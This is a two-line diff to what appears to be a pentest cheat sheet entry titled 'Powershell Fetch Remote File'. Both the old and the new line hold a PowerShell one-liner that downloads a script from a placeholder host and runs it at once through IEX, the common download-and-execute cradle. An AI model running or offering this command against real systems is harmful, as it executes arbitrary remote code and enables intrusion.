@@ -1,2 +1,2 @@
 # Powershell Fetch Remote File
-powershell "IEX(New-Object Net.WebClient).DownloadString('http://someFile')"
+powershell "IEX(New-Object Net.WebClient).DownloadString('http://host:port/file')"
